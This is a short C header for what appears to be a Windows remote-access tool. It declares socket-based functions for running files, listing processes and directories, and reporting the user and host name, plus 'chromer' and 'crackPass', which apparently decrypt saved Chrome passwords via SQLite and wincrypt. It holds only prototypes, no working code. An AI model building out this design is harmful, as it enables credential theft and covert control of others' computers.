#ifndef CMD_H
#define CMD_H

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <sys/stat.h>
#include <unistd.h>
#include "sqlite3.h"
#include <wincrypt.h>
#include <dirent.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <wincrypt.h>
#pragma comment(lib, "Ws2_32.lib")

int lolps(char* returnval);
void dir(char* returnval);
void exec(char* returnval, int returnsize, char *fileexec);
void whoami(char* returnval, int returnsize);
void hostname(char* returnval, int returnsize);
void pwd(char* returnval, int returnsize);
int chromer(SOCKET tcpsock);
char *crackPass(BYTE *pass);
static int callback(void *data, int argc, char **argv, char **azColName);

#endif
